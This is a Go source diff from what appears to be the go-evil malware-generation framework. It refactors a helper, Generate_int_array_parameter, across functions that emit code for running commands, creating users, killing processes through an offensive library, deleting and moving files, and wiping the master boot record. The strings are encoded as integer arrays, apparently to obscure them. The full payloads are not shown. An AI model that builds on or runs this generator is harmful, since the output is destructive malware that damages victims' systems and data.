@@ -30,7 +30,7 @@ func Exit(s_json string, return_code string) ([]string, string) {
 	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
 	data_object.Add_go_import("os")
 
-	parameter_1 := tools.Generate_int_array_parameter(return_code)
+	parameter_1 := data_object.Generate_int_array_parameter(return_code)
 
 	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}, structure.Send(data_object)
 }
@@ -53,7 +53,7 @@ func Out(s_json string, msg string) ([]string, string) {
 	data_object.Add_go_import("fmt")
 
 	// Construct our int array
-	parameter := tools.Generate_int_array_parameter(msg)
+	parameter := data_object.Generate_int_array_parameter(msg)
 
 	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
 }
@@ -76,7 +76,7 @@ func Outln(s_json string, msg string) ([]string, string) {
 	data_object.Add_go_import("fmt")
 
 	// Construct our int array
-	parameter := tools.Generate_int_array_parameter(msg)
+	parameter := data_object.Generate_int_array_parameter(msg)
 
 	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
 }
@@ -109,7 +109,7 @@ func Exec(s_json string, cmd string) ([]string, string) {
 	data_object.Add_go_import("strings")
 
 	// Construct our int array
-	parameter := tools.Generate_int_array_parameter(cmd)
+	parameter := data_object.Generate_int_array_parameter(cmd)
 
 	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
 }
@@ -321,8 +321,8 @@ func write(s_json string, value string) ([]string, string) {
 	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
 	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 
-	parameter_path := tools.Generate_int_array_parameter(path)
-	parameter_data := tools.Generate_int_array_parameter(data)
+	parameter_path := data_object.Generate_int_array_parameter(path)
+	parameter_data := data_object.Generate_int_array_parameter(data)
 
 	return []string{fmt.Sprintf("%s(%s, %s)", function_call, parameter_path, parameter_data)}, structure.Send(data_object)
 }
@@ -351,7 +351,7 @@ func read(s_json string, value string) ([]string, string) {
 	data_object.Add_go_import("io/ioutil")
 
 	// Construct our int array
-	parameter := tools.Generate_int_array_parameter(value)
+	parameter := data_object.Generate_int_array_parameter(value)
 
 	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
 
@@ -437,7 +437,7 @@ func remove(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 
 	// Construct our int array
-	parameter := tools.Generate_int_array_parameter(value)
+	parameter := data_object.Generate_int_array_parameter(value)
 
 	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
 
@@ -481,10 +481,10 @@ func move(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 
 	// Construct our int array
-	old_parameter := tools.Generate_int_array_parameter(old_path)
+	old_parameter := data_object.Generate_int_array_parameter(old_path)
 
 	// Construct our int array
-	new_parameter := tools.Generate_int_array_parameter(new_path)
+	new_parameter := data_object.Generate_int_array_parameter(new_path)
 
 	return []string{fmt.Sprintf("%s(%s, %s)", function_call, old_parameter, new_parameter)}, structure.Send(data_object)
 
@@ -540,8 +540,8 @@ func copy(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 
 	// Construct our int array
-	old_parameter := tools.Generate_int_array_parameter(old_path)
-	new_parameter := tools.Generate_int_array_parameter(new_path)
+	old_parameter := data_object.Generate_int_array_parameter(old_path)
+	new_parameter := data_object.Generate_int_array_parameter(new_path)
 
 	return []string{fmt.Sprintf("%s(%s, %s)", function_call, old_parameter, new_parameter)}, structure.Send(data_object)
 }
@@ -589,7 +589,7 @@ func change_background(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 
 	// Construct our int array
-	parameter := tools.Generate_int_array_parameter(value)
+	parameter := data_object.Generate_int_array_parameter(value)
 
 	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
 }
@@ -667,8 +667,8 @@ func create_user(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("os/exec")
 	data_object.Add_go_import("strings")
 
-	parameter_1 := tools.Generate_int_array_parameter(arr.Get(0))
-	parameter_2 := tools.Generate_int_array_parameter(arr.Get(1))
+	parameter_1 := data_object.Generate_int_array_parameter(arr.Get(0))
+	parameter_2 := data_object.Generate_int_array_parameter(arr.Get(1))
 
 	return []string{fmt.Sprintf("%s(%s, %s)", function_call, parameter_1, parameter_2)}, structure.Send(data_object)
 }
@@ -695,7 +695,7 @@ func kill_process_id(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
 	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
 
-	parameter_1 := tools.Generate_int_array_parameter(value)
+	parameter_1 := data_object.Generate_int_array_parameter(value)
 
 	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}, structure.Send(data_object)
 }
@@ -721,7 +721,7 @@ func kill_process_name(value string, s_json string) ([]string, string) {
 
 	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
 
-	parameter_1 := tools.Generate_int_array_parameter(value)
+	parameter_1 := data_object.Generate_int_array_parameter(value)
 
 	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}, structure.Send(data_object)
 }
@@ -821,7 +821,7 @@ func wipe_mbr(value string, s_json string) ([]string, string) {
 
 	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
 
-	parameter_1 := tools.Generate_int_array_parameter(device)
+	parameter_1 := data_object.Generate_int_array_parameter(device)
 
 	return []string{fmt.Sprintf("%s(%s, %t)", function_call, parameter_1, wipe_partition_table)}, structure.Send(data_object)
 }
